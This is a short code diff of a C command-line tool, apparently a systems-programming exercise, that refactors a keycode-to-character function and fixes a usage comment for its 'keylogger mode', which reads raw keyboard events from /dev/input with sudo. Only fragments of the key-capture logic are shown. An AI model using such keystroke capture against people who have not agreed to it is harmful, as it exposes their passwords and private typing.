@@ -174,11 +174,10 @@ void write_timestamp(int fd)
     write(fd, timestamp, strlen(timestamp));
 }
 
-static int isShiftPressed = 0;
-
 // Function to convert keycode to character
 char keycode_to_char(int keycode) 
 {
+    static int isShiftPressed = 0;
     // Define regular key map
     char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
     
@@ -375,7 +374,7 @@ int main(int argc, char *argv[]) {
         ./supercommand -m 2 3                       // Print working directory
         ./supercommand -m 2 4 myDir                 // List files in directory
 
-        ./sudo supercommand -m 3 /dev/input/event2  // Keylogger mode
+        sudo ./supercommand -m 3 /dev/input/event2  // Keylogger mode
 
     */
     if (argc < 3) {
